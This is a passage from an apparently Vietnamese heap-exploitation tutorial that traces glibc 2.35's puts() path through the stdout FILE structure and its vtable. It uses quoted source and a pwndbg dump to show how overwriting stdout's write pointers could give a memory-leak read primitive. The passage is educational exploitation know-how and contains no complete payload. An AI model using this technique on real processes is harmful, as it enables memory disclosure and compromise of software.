</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&gt;</span> to_do)
</span></span><span style="display:flex;"><span>	count <span style="color:#f92672">=</span> to_do;
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">__mempcpy</span> (f<span style="color:#f92672">-&gt;</span>_IO_write_ptr, s, count);
</span></span><span style="display:flex;"><span>      s <span style="color:#f92672">+=</span> count;
</span></span><span style="display:flex;"><span>      to_do <span style="color:#f92672">-=</span> count;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (to_do <span style="color:#f92672">+</span> must_flush <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">size_t</span> block_size, do_write;
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Next flush the (full) buffer. */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_IO_OVERFLOW</span> (f, EOF) <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* If nothing else has to be written we must not signal the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	   caller that everything has been written.  */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> to_do <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> EOF : n <span style="color:#f92672">-</span> to_do;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Try to maintain alignment: write a whole number of blocks.  */</span>
</span></span><span style="display:flex;"><span>      block_size <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_end <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>      do_write <span style="color:#f92672">=</span> to_do <span style="color:#f92672">-</span> (block_size <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">?</span> to_do <span style="color:#f92672">%</span> block_size : <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (do_write)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  count <span style="color:#f92672">=</span> <span style="color:#a6e22e">new_do_write</span> (f, s, do_write);
</span></span><span style="display:flex;"><span>	  to_do <span style="color:#f92672">-=</span> count;
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&lt;</span> do_write)
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">return</span> n <span style="color:#f92672">-</span> to_do;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Now write out the remainder.  Normally, this will fit in the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 buffer, but it&#39;s somewhat messier for line-buffered files,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 so we let _IO_default_xsputn handle the general case. */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (to_do)
</span></span><span style="display:flex;"><span>	to_do <span style="color:#f92672">-=</span> <span style="color:#a6e22e">_IO_default_xsputn</span> (f, s<span style="color:#f92672">+</span>do_write, to_do);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> n <span style="color:#f92672">-</span> to_do;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc_hidden_ver</span> (_IO_new_file_xsputn, _IO_file_xsputn)
</span></span></code></pre></div><p>Trc khi gi n hm <code>new_do_write()</code>, ta    trn gi n <code>_IO_OVERFLOW()</code>.</p>
<p>Vo hm <code>_IO_OVERFLOW()</code> th trong vtable ca <code>stdout</code>, n gi n hm <code>_IO_new_file_overflow()</code></p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L730">_IO_new_file_overflow</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_IO_new_file_overflow</span> (FILE <span style="color:#f92672">*</span>f, <span style="color:#66d9ef">int</span> ch)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_NO_WRITES) <span style="color:#75715e">/* SET ERROR */</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">|=</span> _IO_ERR_SEEN;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__set_errno</span> (EBADF);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> EOF;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* If currently reading or no buffer allocated. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_CURRENTLY_PUTTING) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Allocate a buffer if needed. */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">_IO_doallocbuf</span> (f);
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">_IO_setg</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_buf_base, f<span style="color:#f92672">-&gt;</span>_IO_buf_base, f<span style="color:#f92672">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* Otherwise must be currently reading.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 logically slide the buffer forwards one block (by setting the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 read pointers to all point at the beginning of the block).  This
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 makes room for subsequent output.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 Otherwise, set the read pointers to _IO_read_end (leaving that
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 alone, so it can continue to correspond to the external position). */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__glibc_unlikely</span> (<span style="color:#a6e22e">_IO_in_backup</span> (f)))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">size_t</span> nbackup <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_read_ptr;
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">_IO_free_backup_area</span> (f);
</span></span><span style="display:flex;"><span>	  f<span style="color:#f92672">-&gt;</span>_IO_read_base <span style="color:#f92672">-=</span> <span style="color:#a6e22e">MIN</span> (nbackup,
</span></span><span style="display:flex;"><span>				   f<span style="color:#f92672">-&gt;</span>_IO_read_base <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>	  f<span style="color:#f92672">-&gt;</span>_IO_read_ptr <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_base;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_IO_read_ptr <span style="color:#f92672">==</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_end)
</span></span><span style="display:flex;"><span>	f<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_ptr <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_ptr;
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_write_ptr;
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_end;
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_IO_read_base <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_ptr <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_read_end;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">|=</span> _IO_CURRENTLY_PUTTING;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_mode <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> (_IO_LINE_BUF <span style="color:#f92672">|</span> _IO_UNBUFFERED))
</span></span><span style="display:flex;"><span>	f<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>_IO_write_ptr;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ch <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_IO_do_write</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_write_base,
</span></span><span style="display:flex;"><span>			 f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">==</span> f<span style="color:#f92672">-&gt;</span>_IO_buf_end ) <span style="color:#75715e">/* Buffer is really full */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_IO_do_flush</span> (f) <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> EOF;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>f<span style="color:#f92672">-&gt;</span>_IO_write_ptr<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> ch;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_UNBUFFERED)
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">||</span> ((f<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_LINE_BUF) <span style="color:#f92672">&amp;&amp;</span> ch <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_IO_do_write</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_write_base,
</span></span><span style="display:flex;"><span>		      f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base) <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> EOF;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>) ch;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc_hidden_ver</span> (_IO_new_file_overflow, _IO_file_overflow)
</span></span></code></pre></div><p>Lu  rng, tham s th 2 ang lu gi tr <code>EOF</code> (ch == EOF).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ch <span style="color:#f92672">==</span> EOF)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_IO_do_write</span> (f, f<span style="color:#f92672">-&gt;</span>_IO_write_base,
</span></span><span style="display:flex;"><span>			 f<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>_IO_write_base);
</span></span></code></pre></div><p><code>_IO_do_write()</code> l hm cui cng c gi v n l alias ti <code>_IO_new_do_write()</code></p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L422">_IO_new_do_write</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">size_t</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_do_write</span> (FILE <span style="color:#f92672">*</span>fp, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">size_t</span> to_do)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> count;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> _IO_IS_APPENDING)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* On a system without a proper O_APPEND implementation,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       you would need to sys_seek(0, SEEK_END) here, but is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       not needed nor desirable for Unix- or Posix-like systems.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       Instead, just indicate that offset (before and after) is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       unpredictable. */</span>
</span></span><span style="display:flex;"><span>    fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> _IO_pos_BAD;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">!=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">off64_t</span> new_pos
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_SYSSEEK</span> (fp, fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">-</span> fp<span style="color:#f92672">-&gt;</span>_IO_read_end, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (new_pos <span style="color:#f92672">==</span> _IO_pos_BAD)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> new_pos;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  count <span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_SYSWRITE</span> (fp, data, to_do);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">&amp;&amp;</span> count)
</span></span><span style="display:flex;"><span>    fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_adjust_column</span> (fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, data, count) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_IO_setg</span> (fp, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>  fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>  fp<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">=</span> (fp<span style="color:#f92672">-&gt;</span>_mode <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>		       <span style="color:#f92672">&amp;&amp;</span> (fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> (_IO_LINE_BUF <span style="color:#f92672">|</span> _IO_UNBUFFERED))
</span></span><span style="display:flex;"><span>		       <span style="color:#f92672">?</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base : fp<span style="color:#f92672">-&gt;</span>_IO_buf_end);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> count;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Cui cng trong hm <code>_IO_new_do_write()</code> n gi ti <code>_IO_SYSWRITE (fp, data, to_do)</code>.</p>
<p><code>_IO_SYSWRITE</code> tr ti key <code>__write</code> trong vtable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#__write = 0x7ffff7c84f80 &lt;_IO_new_file_write&gt;
</span></span></span></code></pre></div><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L1172">_IO_new_file_write</a></p>
<pre tabindex="0"><code>ssize_t
_IO_new_file_write (FILE *f, const void *data, ssize_t n)
{
  ssize_t to_do = n;
  while (to_do &gt; 0)
    {
      ssize_t count = (__builtin_expect (f-&gt;_flags2
                                         &amp; _IO_FLAGS2_NOTCANCEL, 0)
			   ? __write_nocancel (f-&gt;_fileno, data, to_do)
			   : __write (f-&gt;_fileno, data, to_do)); -&gt; target
      if (count &lt; 0)
	{
	  f-&gt;_flags |= _IO_ERR_SEEN;
	  break;
	}
      to_do -= count;
      data = (void *) ((char *) data + count);
    }
  n -= to_do;
  if (f-&gt;_offset &gt;= 0)
    f-&gt;_offset += n;
  return n;
}
</code></pre><p>R rng ta thy, cui cng n s gi syscall <code>write()</code>  thc hin in ra mn hnh ?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">__write</span> (f<span style="color:#f92672">-&gt;</span>_fileno, data, to_do)
</span></span></code></pre></div><p>Mnh tm tt flow ca hm <code>puts()</code> thnh 1 s  sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">puts</span>(str)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_ <span style="color:#a6e22e">_IO_new_file_xsputn</span> (stdout, str, len)
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">|</span>_ <span style="color:#a6e22e">_IO_new_file_overflow</span> (stdout, EOF)
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">|</span>_ <span style="color:#a6e22e">new_do_write</span>(stdout, stdout<span style="color:#f92672">-&gt;</span>_IO_write_base, stdout<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> stdout<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">|</span>_ <span style="color:#a6e22e">_IO_new_file_write</span>(stdout, stdout<span style="color:#f92672">-&gt;</span>_IO_write_base, stdout<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> stdout<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">|</span>_ <span style="color:#a6e22e">write</span>(stdout<span style="color:#f92672">-&gt;</span>fileno, stdout<span style="color:#f92672">-&gt;</span>_IO_write_base, stdout<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">-</span> stdout<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span></code></pre></div><p>-&gt; Mi th  r rng ri, mc tiu ca chng ta l lm sao  thc hin c <code>write(stdout-&gt;fileno, stdout-&gt;_IO_write_base, stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base)</code>. Vic cn lm u tin l ta phi bypass c 1 lot check  s  trn.</p>
<p>Lc gi n syscall <code>write</code>, mnh kim tra gi tr ca tng bin trong write.
Mnh t break points ngay hm <code>write</code> v ln lt kim tra</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p _IO_2_1_stdout_
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  file <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    _flags <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">72537468</span>,
</span></span><span style="display:flex;"><span>    _IO_read_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_read_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_read_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592ac</span> <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_buf_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555592a0</span> <span style="color:#e6db74">&#34;FSOP ATTACK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_buf_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5555555596a0</span> <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_save_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _IO_backup_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _IO_save_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _markers <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _chain <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7df6aa0</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdin_<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _fileno <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _flags2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _old_offset <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _cur_column <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _vtable_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;\000&#39;</span>,
</span></span><span style="display:flex;"><span>    _shortbuf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>    _lock <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7df8a30</span> <span style="color:#f92672">&lt;</span>_IO_stdfile_1_lock<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _offset <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _codecvt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _wide_data <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7df69a0</span> <span style="color:#f92672">&lt;</span>_IO_wide_data_1<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _freeres_list <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _freeres_buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    __pad5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _mode <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _unused2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\000&#39;</span> <span style="color:#f92672">&lt;</span>repeats <span style="color:#ae81ff">19</span> times<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  vtable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7df3600</span> <span style="color:#f92672">&lt;</span>_IO_file_jumps<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Lc ny:
<code>stdout-&gt;fileno = 1</code>
<code>stdout-&gt;_IO_write_ptr = 0x5555555592ac</code>
<code>stdout-&gt;_IO_write_base = 0x5555555592a0 &quot;FSOP ATTACK\n&quot;</code></p>
<p>Gi tr <code>stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base</code> ng bng 12, bng  di ca chui m chng ta mun in.</p>
<p>1 suy ngh hin ln, nu ta c th ghi  nhng gi tr ny ? C ngha l ta s iu khin n in ci g m ta mun :&gt;. Khi  chng ta khng cn phi quan ngi iu g c khi  c a ch LIBC&hellip; Hn th na l STACK, PIE, &hellip;..</p>
<p>Nhng i khng nh l m, s tht <del>n no</del> , chng ta bt buc phi bypass tt c cc iu kin  trn nu chng ta mun c <strong>READ PRIMITIVE</strong>.</p>
<p>Cc macro c define nh sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define _IO_MAGIC 0xFBAD0000 </span><span style="color:#75715e">/* Magic number */</span><span style="color:#75715e">
